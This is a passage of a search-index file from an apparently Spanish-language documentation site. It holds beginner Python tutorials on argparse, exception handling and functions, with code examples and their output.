\"Epilog, es el footer del help\" ) args = parser . parse_args () python3 provando_agparse.py -h usage: provando_argparse.py [ options ] haciendo pruevas con argparse ---------------------------- Prueva de formato literal optional arguments: -h, --help show this help message and exit","title":"Help"},{"location":"lenguajes/python3/argparse/#version","text":"parser = argparse . ArgumentParser ( prog = 'provando_argparse.py' , usage = ' %(prog)s [options]' , formatter_class = argparse . RawDescriptionHelpFormatter , description = ''' haciendo pruevas con argparse ---------------------------- Prueva de formato literal''' , epilog = \"Epilog, es el footer del help\" ) parser . add_argument ( '--version' , action = 'version' , version = ' %(prog)s 1.0' ) args = parser . parse_args ()","title":"Version"},{"location":"lenguajes/python3/argparse/#argumento-opcional-unico-en-str","text":"analizador = argparse . ArgumentParser ( description = 'Tutorial sobre argparse.' ) analizador . add_argument ( \"-a\" , \"--add\" , help = \"Detecta y confirma primer argumento\" ) argumento = analizador . parse_args () if argumento . add : print ( \"Argumento opcional solicitado -a\" ) print ( \"Argumento dado: \" + argumento . add )","title":"Argumento opcional, \u00fanico en str"},{"location":"lenguajes/python3/argparse/#argumento-opcional-unico-en-int","text":"type permite obligar, que el argumento insertado sea de un tipo o otro. analizador = argparse . ArgumentParser ( description = 'Tutorial sobre argparse.' ) analizador . add_argument ( \"-i\" , \"--integer\" , help = \"Detecta y confirma primer argumento integer\" , type = int ) argumento = analizador . parse_args () if argumento . integer : print ( \"Argumento opcional solicitado -i\" ) print ( \"Argumento dado: \" , argumento . integer )","title":"Argumento opcional, unico en int"},{"location":"lenguajes/python3/argparse/#argumento-obligatorio","text":"Al a\u00f1adir un argumento sin el - se convierte en obligatorio, no se podra ejecutar el script sin como minimo 1 argumento. ej: python3 prog.py file.txt analizador = argparse . ArgumentParser ( description = 'Tutorial sobre argparse.' ) analizador . add_argument ( \"archivo\" , help = \"Argumento obligatorio\" ) argumento = analizador . parse_args () if argumento . archivo : print ( \"Argumento obligatorio: archivo\" ) print ( \"Nombre del archivo: \" + argumento . archivo )","title":"Argumento obligatorio"},{"location":"lenguajes/python3/argparse/#numero-de-argumentos-esplicito","text":"nargs permite indicar cuantos argumentos quieres que entren por opci\u00f3n analizador = argparse . ArgumentParser ( description = 'Tutorial sobre argparse.' ) analizador . add_argument ( \"-s\" , \"--suma\" , help = \"Suma 2 argumentos numericos\" , nargs = 2 , type = int ) argumento = analizador . parse_args () if argumento . suma : print ( \"Argumento opcional solicitado -s\" ) print ( f \"Resultado de { argumento . suma [ 0 ] } + { argumento . suma [ 1 ] } = { argumento . suma [ 0 ] + argumento . suma [ 1 ] } \" )","title":"N\u00famero de argumentos esplicito"},{"location":"lenguajes/python3/argparse/#numero-x-de-argumentos","text":"nargs nos deja jugar con alguna expresi\u00f3n regular por ejemplo. N The absolute number of arguments (e.g., 3). ? 0 or 1 arguments * 0 or all arguments + Todos, y al menos un argumento. analizador = argparse . ArgumentParser ( description = 'Tutorial sobre argparse.' ) analizador . add_argument ( \"-l\" , \"--lista\" , help = \"Muestra todos los argumentos dados de 0 a n\" , nargs = \"*\" ) argumento = analizador . parse_args () if argumento . lista : print ( \"Argumento opcional solicitado -l\" ) print ( f \"la lista de argumentos es: { argumento . lista } \" )","title":"N\u00famero x de argumentos"},{"location":"lenguajes/python3/argparse/#opciones-por-default","text":"En n argumento obligatorio si le a\u00f1adimos un valor por defecto, se convierte en, no obligatorio al ya tener un valor predeterminado. Muy \u00fatil para scripts con rutas predeterminadas e indicarle al usuario s quiere otra opcional que la escriba. analizador = argparse . ArgumentParser ( description = 'Tutorial sobre argparse.' ) analizador . add_argument ( \"defecto\" , help = \"Muestra argumento y si no hay muestra el por defecto\" , nargs = \"?\" , default = 'hola mundo' ) argumento = analizador . parse_args () if argumento . defecto : print ( \"Argumento opcional solicitado -d\" ) print ( f \"la lista de argumentos es: { argumento . defecto } \" )","title":"Opciones por default"},{"location":"lenguajes/python3/argparse/#opcional-en-obligatorio","text":"required obliga a que se a\u00f1ada el argumento obligatoriamente. analizador = argparse . ArgumentParser ( description = 'Tutorial sobre argparse.' ) analizador . add_argument ( \"-r\" , \"--required\" , help = \"Lista los n argumentos dados\" , required = True , nargs = \"*\" ) argumento = analizador . parse_args () if argumento . required : print ( \"Argumento opcional solicitado -r\" ) print ( f \"Argumento dado: { argumento . required } \" )","title":"Opcional en obligatorio"},{"location":"lenguajes/python3/argparse/#lista-opciones-de-argumento","text":"choices opciones de argumento, solo aceptara esas opciones al argumento indicado. analizador = argparse . ArgumentParser ( description = 'Tutorial sobre argparse.' ) analizador . add_argument ( \"mes\" , choices = [ 'Enero' , 'Abril' , 'Julio' , 'Octubre' ], help = \"Permite escoger un mes de comienzo de trimestre.\" , ) argumento = analizador . parse_args () print ( \"Argumento: solicita un mes de una lista predeterminada.\" ) print ( \"Mes escogido:\" ) print ( argumento . mes )","title":"Lista opciones de argumento"},{"location":"lenguajes/python3/argparse/#verificar-opcion","text":"action=store_true si la opci\u00f3n a sido a\u00f1adida retornara un valor de True en el caso contrario False analizador = argparse . ArgumentParser ( description = 'Tutorial sobre argparse.' ) analizador . add_argument ( \"-l\" , \"--long\" , help = \"Detecta y confirma primer argumento\" , action = \"store_true\" ) analizador . add_argument ( \"-a\" , \"--arbol\" , help = \"Detecta y confirma primer argumento\" , action = \"store_true\" ) argumento = analizador . parse_args () if argumento . long : print ( \"Argumento --long devuelve: \" , argumento . long ) if argumento . arbol : print ( \"Argumento --arbol devuelve: \" , argumento . arbol ) action=count tiene el poder de contar las veces que a\u00f1ades repetidament la opci\u00f3n, utilizado en vervose comunmente -v -vv -vvv parser = argparse . ArgumentParser () parser . add_argument ( \"square\" , type = int , help = \"display the square of a given number\" ) parser . add_argument ( \"-v\" , \"--verbosity\" , action = \"count\" , default = 0 , help = \"increase output verbosity\" ) args = parser . parse_args () answer = args . square ** 2 if args . verbosity >= 2 : print ( \"the square of {} equals {} \" . format ( args . square , answer )) elif args . verbosity >= 1 : print ( \" {} ^2 == {} \" . format ( args . square , answer )) else : print ( answer )","title":"Verificar opci\u00f3n"},{"location":"lenguajes/python3/argparse/#opciones-incompatibles-entre-ellas","text":"Al crear un grupo de argumentos puedes diferenciar opciones incompatibles, por ejemplo en el siguiente script poedes a\u00f1adir opci\u00f3n -c o -e pero nunca podras a\u00f1adir las 2 a la vez. analizador = argparse . ArgumentParser ( description = 'Tutorial sobre argparse.' ) grupo = analizador . add_mutually_exclusive_group () grupo . add_argument ( \"-c\" , \"--cubo\" , action = \"store_true\" , help = \"Imprime un cubo en tercera dimensi\u00f3n.\" , ) grupo . add_argument ( \"-e\" , \"--esfera\" , action = \"store_true\" , help = \"Imprime una esfera en tercera dimensi\u00f3n.\" , ) argumento = analizador . parse_args () if argumento . cubo : print ( \"'Imprime' un cubo\" ) if argumento . esfera : print ( \"'Imprime' una esfera\" )","title":"Opciones incompatibles entre ellas"},{"location":"lenguajes/python3/fundamentos/excepciones/","text":"Las excepciones Son bloques de c\u00f3digo excepcionales que nos permiten continuar con la ejecuci\u00f3n de un programa pese a que ocurra un error. Try - Except Para prevenir el error, debemos poner el c\u00f3digo propenso a error un bloque try y luego encadenaremos un bloque except para tratar la excepci\u00f3n: try : n = float ( input ( \"Introduce un n\u00famero: \" )) m = 4 print ( \" {} / {} = {} \" . format ( n , m , n / m )) except : print ( \"Ha ocurrido un error, introduce bien el n\u00famero\" ) Introduce un n\u00famero: aaa Ha ocurrido un error, introduce bien el n\u00famero Excepciones en bucle Utilizando un while(true) , podemos asegur\u00e1rnos de que el usuario introduce bien el valor Repitiendo la lectura por teclado hasta que lo haga bien, y entonces rompemos el bucle con un break: while ( True ): try : n = float ( input ( \"Introduce un n\u00famero: \" )) m = 4 print ( \" {} / {} = {} \" . format ( n , m , n / m )) break # Importante romper la iteraci\u00f3n si todo ha salido bien except : print ( \"Ha ocurrido un error, introduce bien el n\u00famero\" ) Introduce un n\u00famero: aaa Ha ocurrido un error, introduce bien el n\u00famero Introduce un n\u00famero: 10 10.0/4=2.5 Else en excepciones Es posible encadenar un bloque else despu\u00e9s del except para comprobar el caso en que todo funcione correctamente (no se ejecuta la excepci\u00f3n). El bloque else es un buen momento para romper la iteraci\u00f3n con break si todo funciona correctamente: while ( True ): try : n = float ( input ( \"Introduce un n\u00famero: \" )) m = 4 print ( \" {} / {} = {} \" . format ( n , m , n / m )) except : print ( \"Ha ocurrido un error, introduce bien el n\u00famero\" ) else : print ( \"Todo ha funcionado correctamente\" ) break # Importante romper la iteraci\u00f3n si todo ha salido bien Introduce un n\u00famero: 10 10.0/4=2.5 Todo ha funcionado correctamente Finally en excepciones Por \u00faltimo es posible utilizar un bloque finally que se ejecute al final del c\u00f3digo, ocurra o no ocurra un error : while ( True ): try : n = float ( input ( \"Introduce un n\u00famero: \" )) m = 4 print ( \" {} / {} = {} \" . format ( n , m , n / m )) except : print ( \"Ha ocurrido un error, introduce bien el n\u00famero\" ) else : print ( \"Todo ha funcionado correctamente\" ) break # Importante romper la iteraci\u00f3n si todo ha salido bien finally : print ( \"Fin de la iteraci\u00f3n\" ) # Siempre se ejecuta Introduce un n\u00famero: aaa Ha ocurrido un error, introduce bien el n\u00famero Fin de la iteraci\u00f3n Introduce un n\u00famero: 10 10.0/4=2.5 Todo ha funcionado correctamente Fin de la iteraci\u00f3n Capturando m\u00faltiples excepciones Guardando la excepci\u00f3n Podemos asignar una excepci\u00f3n a una variable (por ejemplo e). De esta forma haciendo un peque\u00f1o truco podemos analizar el tipo de error que sucede gracias a su identificador: try : n = input ( \"Introduce un n\u00famero: \" ) 5 / n except Exception as e : print ( type ( e ) . __name__ ) Introduce un n\u00famero: 10 TypeError Encadenando excepciones Gracias a los identificadores de errores podemos crear m\u00faltiples comprobaciones, siempre que dejemos en \u00faltimo lugar la excepci\u00f3n por defecto Excepcion que engloba cualquier tipo de error (si la pusi\u00e9ramos al principio, las demas excepciones nunca se ejecutar\u00edan): try : n = float ( input ( \"Introduce un n\u00famero: \" )) 5 / n except TypeError : print ( \"No se puede dividir el n\u00famero por una cadena\" ) except ValueError : print ( \"Debes introducir una cadena que sea un n\u00famero\" ) except ZeroDivisionError : print ( \"No se puede dividir por cero, prueba otro n\u00famero\" ) except Exception as e : print ( type ( e ) . __name__ ) Introduce un n\u00famero: aaaa ValueError Invocaci\u00f3n de excepciones La instrucci\u00f3n raise Gracias a raise podemos lanzar un error manual pas\u00e1ndole el identificador. Luego simplemente podemos a\u00f1adir un except para tratar esta excepci\u00f3n que hemos lanzado: def mi_funcion ( algo = None ): try : if algo is None : raise ValueError ( \"Error! No se permite un valor nulo\" ) except ValueError : print ( \"Error! No se permite un valor nulo (desde la excepci\u00f3n)\" ) mi_funcion () Error! No se permite un valor nulo (desde la excepci\u00f3n) Ejercicio Realiza una funci\u00f3n llamada agregar_una_vez() que reciba una lista y un elemento. La funci\u00f3n debe a\u00f1adir el elemento al final de la lista con la condici\u00f3n de no repetir ning\u00fan elemento. Adem\u00e1s si este elemento ya se encuentra en la lista se debe invocar un error de tipo ValueError que debes capturar y mostrar este mensaje en su lugar: Error: Imposible a\u00f1adir elementos duplicados => [elemento]. Pueba de agregar los elementos 10, -2, \"Hola\" a la lista de elementos con la funci\u00f3n una vez la has creado y luego muestra su contenido. elementos = [ 1 , 5 , - 2 ] def agregar_una_vez ( lista , el ): try : if el in lista : raise ValueError else : lista . append ( el ) except ValueError : print ( \"Error: Imposible a\u00f1adir elementos duplicados =>\" , el ) agregar_una_vez ( elementos , 10 ) agregar_una_vez ( elementos , - 2 ) agregar_una_vez ( elementos , \"Hola\" ) print ( elementos ) Error: Imposible a\u00f1adir elementos duplicados => -2 [1, 5, -2, 10, 'Hola']","title":"Las excepciones"},{"location":"lenguajes/python3/fundamentos/excepciones/#las-excepciones","text":"Son bloques de c\u00f3digo excepcionales que nos permiten continuar con la ejecuci\u00f3n de un programa pese a que ocurra un error.","title":"Las excepciones"},{"location":"lenguajes/python3/fundamentos/excepciones/#try-except","text":"Para prevenir el error, debemos poner el c\u00f3digo propenso a error un bloque try y luego encadenaremos un bloque except para tratar la excepci\u00f3n: try : n = float ( input ( \"Introduce un n\u00famero: \" )) m = 4 print ( \" {} / {} = {} \" . format ( n , m , n / m )) except : print ( \"Ha ocurrido un error, introduce bien el n\u00famero\" ) Introduce un n\u00famero: aaa Ha ocurrido un error, introduce bien el n\u00famero","title":"Try - Except"},{"location":"lenguajes/python3/fundamentos/excepciones/#excepciones-en-bucle","text":"Utilizando un while(true) , podemos asegur\u00e1rnos de que el usuario introduce bien el valor Repitiendo la lectura por teclado hasta que lo haga bien, y entonces rompemos el bucle con un break: while ( True ): try : n = float ( input ( \"Introduce un n\u00famero: \" )) m = 4 print ( \" {} / {} = {} \" . format ( n , m , n / m )) break # Importante romper la iteraci\u00f3n si todo ha salido bien except : print ( \"Ha ocurrido un error, introduce bien el n\u00famero\" ) Introduce un n\u00famero: aaa Ha ocurrido un error, introduce bien el n\u00famero Introduce un n\u00famero: 10 10.0/4=2.5","title":"Excepciones en bucle"},{"location":"lenguajes/python3/fundamentos/excepciones/#else-en-excepciones","text":"Es posible encadenar un bloque else despu\u00e9s del except para comprobar el caso en que todo funcione correctamente (no se ejecuta la excepci\u00f3n). El bloque else es un buen momento para romper la iteraci\u00f3n con break si todo funciona correctamente: while ( True ): try : n = float ( input ( \"Introduce un n\u00famero: \" )) m = 4 print ( \" {} / {} = {} \" . format ( n , m , n / m )) except : print ( \"Ha ocurrido un error, introduce bien el n\u00famero\" ) else : print ( \"Todo ha funcionado correctamente\" ) break # Importante romper la iteraci\u00f3n si todo ha salido bien Introduce un n\u00famero: 10 10.0/4=2.5 Todo ha funcionado correctamente","title":"Else en excepciones"},{"location":"lenguajes/python3/fundamentos/excepciones/#finally-en-excepciones","text":"Por \u00faltimo es posible utilizar un bloque finally que se ejecute al final del c\u00f3digo, ocurra o no ocurra un error : while ( True ): try : n = float ( input ( \"Introduce un n\u00famero: \" )) m = 4 print ( \" {} / {} = {} \" . format ( n , m , n / m )) except : print ( \"Ha ocurrido un error, introduce bien el n\u00famero\" ) else : print ( \"Todo ha funcionado correctamente\" ) break # Importante romper la iteraci\u00f3n si todo ha salido bien finally : print ( \"Fin de la iteraci\u00f3n\" ) # Siempre se ejecuta Introduce un n\u00famero: aaa Ha ocurrido un error, introduce bien el n\u00famero Fin de la iteraci\u00f3n Introduce un n\u00famero: 10 10.0/4=2.5 Todo ha funcionado correctamente Fin de la iteraci\u00f3n","title":"Finally en excepciones"},{"location":"lenguajes/python3/fundamentos/excepciones/#capturando-multiples-excepciones","text":"Guardando la excepci\u00f3n Podemos asignar una excepci\u00f3n a una variable (por ejemplo e). De esta forma haciendo un peque\u00f1o truco podemos analizar el tipo de error que sucede gracias a su identificador: try : n = input ( \"Introduce un n\u00famero: \" ) 5 / n except Exception as e : print ( type ( e ) . __name__ ) Introduce un n\u00famero: 10 TypeError Encadenando excepciones Gracias a los identificadores de errores podemos crear m\u00faltiples comprobaciones, siempre que dejemos en \u00faltimo lugar la excepci\u00f3n por defecto Excepcion que engloba cualquier tipo de error (si la pusi\u00e9ramos al principio, las demas excepciones nunca se ejecutar\u00edan): try : n = float ( input ( \"Introduce un n\u00famero: \" )) 5 / n except TypeError : print ( \"No se puede dividir el n\u00famero por una cadena\" ) except ValueError : print ( \"Debes introducir una cadena que sea un n\u00famero\" ) except ZeroDivisionError : print ( \"No se puede dividir por cero, prueba otro n\u00famero\" ) except Exception as e : print ( type ( e ) . __name__ ) Introduce un n\u00famero: aaaa ValueError","title":"Capturando m\u00faltiples excepciones"},{"location":"lenguajes/python3/fundamentos/excepciones/#invocacion-de-excepciones","text":"La instrucci\u00f3n raise Gracias a raise podemos lanzar un error manual pas\u00e1ndole el identificador. Luego simplemente podemos a\u00f1adir un except para tratar esta excepci\u00f3n que hemos lanzado: def mi_funcion ( algo = None ): try : if algo is None : raise ValueError ( \"Error! No se permite un valor nulo\" ) except ValueError : print ( \"Error! No se permite un valor nulo (desde la excepci\u00f3n)\" ) mi_funcion () Error! No se permite un valor nulo (desde la excepci\u00f3n)","title":"Invocaci\u00f3n de excepciones"},{"location":"lenguajes/python3/fundamentos/excepciones/#ejercicio","text":"Realiza una funci\u00f3n llamada agregar_una_vez() que reciba una lista y un elemento. La funci\u00f3n debe a\u00f1adir el elemento al final de la lista con la condici\u00f3n de no repetir ning\u00fan elemento. Adem\u00e1s si este elemento ya se encuentra en la lista se debe invocar un error de tipo ValueError que debes capturar y mostrar este mensaje en su lugar: Error: Imposible a\u00f1adir elementos duplicados => [elemento]. Pueba de agregar los elementos 10, -2, \"Hola\" a la lista de elementos con la funci\u00f3n una vez la has creado y luego muestra su contenido. elementos = [ 1 , 5 , - 2 ] def agregar_una_vez ( lista , el ): try : if el in lista : raise ValueError else : lista . append ( el ) except ValueError : print ( \"Error: Imposible a\u00f1adir elementos duplicados =>\" , el ) agregar_una_vez ( elementos , 10 ) agregar_una_vez ( elementos , - 2 ) agregar_una_vez ( elementos , \"Hola\" ) print ( elementos ) Error: Imposible a\u00f1adir elementos duplicados => -2 [1, 5, -2, 10, 'Hola']","title":"Ejercicio"},{"location":"lenguajes/python3/fundamentos/funciones/","text":"Funciones Son fragmentos de c\u00f3digo que se pueden ejecutar m\u00faltiples veces. Pueden recibir y devolver informaci\u00f3n para comunicarse con el proceso principal. Definici\u00f3n y llamada def saludar (): print ( \"Hola! Este print se llama desde la funci\u00f3n saludar()\" ) saludar () Hola! Este print se llama desde la funci\u00f3n saludar() variables y sentencias de control def dibujar_tabla_del_5 (): for i in range ( 10 ): print ( \"5 * {} = {} \" . format ( i , i * 5 )) dibujar_tabla_del_5 () 5 * 0 = 0 5 * 1 = 5 5 * 2 = 10 5 * 3 = 15 5 * 4 = 20 5 * 5 = 25 5 * 6 = 30 5 * 7 = 35 5 * 8 = 40 5 * 9 = 45 \u00c1mbito de las variables Una variable declarada en una funci\u00f3n no existe en la funci\u00f3n principal: def test (): n = 10 test () print ( n ) --------------------------------------------------------------------------- NameError Traceback (most recent call last) <ipython-input-4-667d7c7a2c02> in <module>() ----> 1 print(n) NameError: name 'n' is not defined Sin embargo, siempre que declaremos la variable antes de la ejecuci\u00f3n, podemos acceder a ella desde dentro: def test (): print ( l ) l = 10 test () 10 En el caso que declaremos de nuevo una variable en la funci\u00f3n, se crear\u00e1 un copia de la misma que s\u00f3lo funcionar\u00e1 dentro de la funci\u00f3n. Por tanto no podemos modificar una variable externa dentro de una funci\u00f3n : def test (): o = 5 # variable que s\u00f3lo existe dentro de la funci\u00f3n print ( o ) test () o = 10 # variable externa, no modificable test () print ( o ) 5 5 10 La instrucci\u00f3n global Para poder modificar una variable externa en la funci\u00f3n, debemos indicar que es global de la siguiente forma: def test (): global o # variable que hace referencia a la o externa o = 5 print ( o ) test () o = 10 test () print ( o ) 5 5 5 Trabajando con argumentos y par\u00e1metros Argumentos por posici\u00f3n def resta ( a , b ): return a - b resta ( 1 , 2 ) # posici\u00f3n \u00edndice 0 valor 1, posici\u00f3n \u00edndice 1 valor 2 -1 Argumentos por nombre resta ( b = 2 , a = 1 ) -1 Llamada sin argumentos Al llamar una funci\u00f3n que tiene definidos unos par\u00e1metros, si no pasamos los argumentos correctamente provocar\u00e1 un error: resta () --------------------------------------------------------------------------- TypeError Traceback (most recent call last) <ipython-input-4-78c8f433960e> in <module>() ----> 1 resta() TypeError: resta() missing 2 required positional arguments: 'a' and 'b' Par\u00e1metros por defecto Para solucionarlo podemos asignar unos valores por defecto nulos a los par\u00e1metros, y de \u00e9sa forma podr\u00edamos hacer una comprobaci\u00f3n antes de ejecutar el c\u00f3digo de la funci\u00f3n: def resta ( a = None , b = None ): if a == None or b == None : print ( \"Error, debes enviar dos n\u00fameros a la funci\u00f3n\" ) return return a - b resta ( 1 , 5 ) -4 Paso por valor y paso por referencia Paso por valor : Se crea una copia local de la variable dentro de la funci\u00f3n. Paso por referencia : Se maneja directamente la variable, los cambios realizados dentro le afectar\u00e1n tambi\u00e9n fuera. Tradicionalmente, los tipos simples se pasan autom\u00e1ticamente por valor y los compuestos por referencia . Simples : Enteros, flotantes, cadenas, l\u00f3gicos... Compuestos : Listas, diccionarios, conjuntos... Paso por valor def doblar_valor ( numero ): numero *= 2 n = 10 doblar_valor ( n ) n 10 Paso por referencia def doblar_valores ( numeros ): for i , n in enumerate ( numeros ): numeros [ i ] *= 2 ns = [ 10 , 50 , 100 ] doblar_valores ( ns ) print ( ns ) [20, 100, 200] Trucos Para modificar los tipos simples podemos devolverlos modificados y reasignarlos: def doblar_valor ( numero ): return numero * 2 n = 10 n = doblar_valor ( n ) print ( n ) 20 Y en el caso de los tipos compuestos, podemos evitar la modificaci\u00f3n enviando una copia: def doblar_valores ( numeros ): for i , n in enumerate ( numeros ): numeros [ i ] *= 2 ns = [ 10 , 50 , 100 ] doblar_valores ( ns [:]) # Una copia al vuelo de una lista con [:] print ( ns ) [10, 50, 100] Argumentos y par\u00e1metros indeterminados Quiz\u00e1 en alguna ocasi\u00f3n no sabemos de antemano cuantos elementos vamos a enviar a una funci\u00f3n. En estos casos podemos utilizar los par\u00e1metros indeterminados por posici\u00f3n y por nombre. Por posici\u00f3n Para recibir un n\u00famero indeterminado de par\u00e1metros por posici\u00f3n, debemos crear una lista din\u00e1mica de argumentos (una tupla en realidad): def indeterminados_posicion ( * args ): for arg in args : print ( arg ) indeterminados_posicion ( 5 , \"Hola\" ,[ 1 , 2 , 3 , 4 , 5 ]) 5 Hola [1, 2, 3, 4, 5] Por nombre Para recibir un n\u00famero indeterminado de par\u00e1metros por nombre (clave-valor), debemos crear un diccionario din\u00e1mico de argumentos: def indeterminados_nombre ( ** kwargs ): print ( kwargs ) indeterminados_nombre ( n = 5 , c = \"Hola\" , l = [ 1 , 2 , 3 , 4 , 5 ]) {'n': 5, 'c': 'Hola', 'l': [1, 2, 3, 4, 5]} def indeterminados_nombre ( ** kwargs ): for kwarg in kwargs : print ( kwarg ) indeterminados_nombre ( n = 5 , c = \"Hola\" , l = [ 1 , 2 , 3 , 4 , 5 ]) n c l def indeterminados_nombre ( ** kwargs ): for kwarg in kwargs : print ( kwarg , \" \" , kwargs [ kwarg ]) indeterminados_nombre ( n = 5 , c = \"Hola\" , l = [ 1 , 2 , 3 , 4 , 5 ]) n 5 c Hola l [1, 2, 3, 4, 5] Por posici\u00f3n y nombre a la vez Si queremos aceptar ambos tipos de par\u00e1metros simult\u00e1neamente, entonces debemos crear ambas colecciones din\u00e1micas: def super_funcion ( * args , ** kwargs ): t = 0 for arg in args : t += arg print ( \"Sumatorio indeterminado es\" , t ) for kwarg in kwargs : print ( kwarg , \" \" , kwargs [ kwarg ]) super_funcion ( 10 , 50 , - 1 , 1.56 , 10 , 20 , 300 , nombre = \"Hector\" , edad = 27 ) Sumatorio indeterinado es 390.56 nombre Hector edad 27 Funciones recursivas Se trata de funciones que se llaman a s\u00ed mismas durante su propia ejecuci\u00f3n. Funcionan de forma similar a las iteraciones, y debemos encargarnos de planificar el momento en que una funci\u00f3n recursiva deja de llamarse o tendremos una funci\u00f3n rescursiva infinita. Suele utilizarse para dividir una tarea en subtareas m\u00e1s simples de forma que sea m\u00e1s f\u00e1cil abordar el problema y solucionarlo. Ejemplo sencillo sin retorno Cuenta regresiva hasta cero a partir de un n\u00famero: def cuenta_atras ( num ): num -= 1 if num > 0 : print ( num ) cuenta_atras ( num ) else : print ( \"Boooooooom!\" ) print ( \"Fin de la funci\u00f3n\" , num ) cuenta_atras ( 5 ) 4 3 2 1 Boooooooom! Fin de la funci\u00f3n 0 Fin de la funci\u00f3n 1 Fin de la funci\u00f3n 2 Fin de la funci\u00f3n 3 Fin de la funci\u00f3n 4 Ejemplo con retorno El factorial de un n\u00famero corresponde al producto de todos los n\u00fameros desde 1 hasta el propio n\u00famero: 3! = 1 x 2 x 3 = 6 5! = 1 x 2 x 3 x 4 x 5 = 120 def factorial ( num ): print ( \"Valor inicial ->\" , num ) if num > 1 : num = num * factorial ( num - 1 ) print ( \"valor final ->\" , num ) return num factorial ( 5 ) Valor inicial -> 5 Valor inicial -> 4 Valor inicial -> 3 Valor inicial -> 2 Valor inicial -> 1 valor final -> 1 valor final -> 2 valor final -> 6 valor final -> 24 valor final -> 120 120","title":"Funciones"},{"location":"lenguajes/python3/fundamentos/funciones/#funciones","text":"Son fragmentos de c\u00f3digo que se pueden ejecutar m\u00faltiples veces. Pueden recibir y devolver informaci\u00f3n para comunicarse con el proceso principal.","title":"Funciones"},{"location":"lenguajes/python3/fundamentos/funciones/#definicion-y-llamada","text":"def saludar (): print ( \"Hola! Este print se llama desde la funci\u00f3n saludar()\" ) saludar () Hola! Este print se llama desde la funci\u00f3n saludar()","title":"Definici\u00f3n y llamada"},{"location":"lenguajes/python3/fundamentos/funciones/#variables-y-sentencias-de-control","text":"def dibujar_tabla_del_5 (): for i in range ( 10 ): print ( \"5 * {} = {} \" . format ( i , i * 5 )) dibujar_tabla_del_5 () 5 * 0 = 0 5 * 1 = 5 5 * 2 = 10 5 * 3 = 15 5 * 4 = 20 5 * 5 = 25 5 * 6 = 30 5 * 7 = 35 5 * 8 = 40 5 * 9 = 45","title":"variables y sentencias de control"},{"location":"lenguajes/python3/fundamentos/funciones/#ambito-de-las-variables","text":"Una variable declarada en una funci\u00f3n no existe en la funci\u00f3n principal: def test (): n = 10 test () print ( n ) --------------------------------------------------------------------------- NameError Traceback (most recent call last) <ipython-input-4-667d7c7a2c02> in <module>() ----> 1 print(n) NameError: name 'n' is not defined Sin embargo, siempre que declaremos la variable antes de la ejecuci\u00f3n, podemos acceder a ella desde dentro: def test (): print ( l ) l = 10 test () 10 En el caso que declaremos de nuevo una variable en la funci\u00f3n, se crear\u00e1 un copia de la misma que s\u00f3lo funcionar\u00e1 dentro de la funci\u00f3n. Por tanto no podemos modificar una variable externa dentro de una funci\u00f3n : def test (): o = 5 # variable que s\u00f3lo existe dentro de la funci\u00f3n print ( o ) test () o = 10 # variable externa, no modificable test () print ( o ) 5 5 10","title":"\u00c1mbito de las variables"},{"location":"lenguajes/python3/fundamentos/funciones/#la-instruccion-global","text":"Para poder modificar una variable externa en la funci\u00f3n, debemos indicar que es global de la siguiente forma: def test (): global o # variable que hace referencia a la o externa o = 5 print ( o ) test () o = 10 test () print ( o ) 5 5 5","title":"La instrucci\u00f3n global"},{"location":"lenguajes/python3/fundamentos/funciones/#trabajando-con-argumentos-y-parametros","text":"","title":"Trabajando con argumentos y par\u00e1metros"},{"location":"lenguajes/python3/fundamentos/funciones/#argumentos-por-posicion","text":"def resta ( a , b ): return a - b resta ( 1 , 2 ) # posici\u00f3n \u00edndice 0 valor 1, posici\u00f3n \u00edndice 1 valor 2 -1","title":"Argumentos por posici\u00f3n"},{"location":"lenguajes/python3/fundamentos/funciones/#argumentos-por-nombre","text":"resta ( b = 2 , a = 1 ) -1","title":"Argumentos por nombre"},{"location":"lenguajes/python3/fundamentos/funciones/#llamada-sin-argumentos","text":"Al llamar una funci\u00f3n que tiene definidos unos par\u00e1metros, si no pasamos los argumentos correctamente provocar\u00e1 un error: resta () --------------------------------------------------------------------------- TypeError Traceback (most recent call last) <ipython-input-4-78c8f433960e> in <module>() ----> 1 resta() TypeError: resta() missing 2 required positional arguments: 'a' and 'b'","title":"Llamada sin argumentos"},{"location":"lenguajes/python3/fundamentos/funciones/#parametros-por-defecto","text":"Para solucionarlo podemos asignar unos valores por defecto nulos a los par\u00e1metros, y de \u00e9sa forma podr\u00edamos hacer una comprobaci\u00f3n antes de ejecutar el c\u00f3digo de la funci\u00f3n: def resta ( a = None , b = None ): if a == None or b == None : print ( \"Error, debes enviar dos n\u00fameros a la funci\u00f3n\" ) return return a - b resta ( 1 , 5 ) -4","title":"Par\u00e1metros por defecto"},{"location":"lenguajes/python3/fundamentos/funciones/#paso-por-valor-y-paso-por-referencia","text":"Paso por valor : Se crea una copia local de la variable dentro de la funci\u00f3n. Paso por referencia : Se maneja directamente la variable, los cambios realizados dentro le afectar\u00e1n tambi\u00e9n fuera. Tradicionalmente, los tipos simples se pasan autom\u00e1ticamente por valor y los compuestos por referencia . Simples : Enteros, flotantes, cadenas, l\u00f3gicos... Compuestos : Listas, diccionarios, conjuntos...","title":"Paso por valor y paso por referencia"},{"location":"lenguajes/python3/fundamentos/funciones/#paso-por-valor","text":"def doblar_valor ( numero ): numero *= 2 n = 10 doblar_valor ( n ) n 10","title":"Paso por valor"},{"location":"lenguajes/python3/fundamentos/funciones/#paso-por-referencia","text":"def doblar_valores ( numeros ): for i , n in enumerate ( numeros ): numeros [ i ] *= 2 ns = [ 10 , 50 , 100 ] doblar_valores ( ns ) print ( ns ) [20, 100, 200]","title":"Paso por referencia"},{"location":"lenguajes/python3/fundamentos/funciones/#trucos","text":"Para modificar los tipos simples podemos devolverlos modificados y reasignarlos: def doblar_valor ( numero ): return numero * 2 n = 10 n = doblar_valor ( n ) print ( n ) 20 Y en el caso de los tipos compuestos, podemos evitar la modificaci\u00f3n enviando una copia: def doblar_valores ( numeros ): for i , n in enumerate ( numeros ): numeros [ i ] *= 2 ns = [ 10 , 50 , 100 ] doblar_valores ( ns [:]) # Una copia al vuelo de una lista con [:] print ( ns ) [10, 50, 100]","title":"Trucos"},{"location":"lenguajes/python3/fundamentos/funciones/#argumentos-y-parametros-indeterminados","text":"Quiz\u00e1 en alguna ocasi\u00f3n no sabemos de antemano cuantos elementos vamos a enviar a una funci\u00f3n. En estos casos podemos utilizar los par\u00e1metros indeterminados por posici\u00f3n y por nombre.","title":"Argumentos y par\u00e1metros indeterminados"},{"location":"lenguajes/python3/fundamentos/funciones/#por-posicion","text":"Para recibir un n\u00famero indeterminado de par\u00e1metros por posici\u00f3n, debemos crear una lista din\u00e1mica de argumentos (una tupla en realidad): def 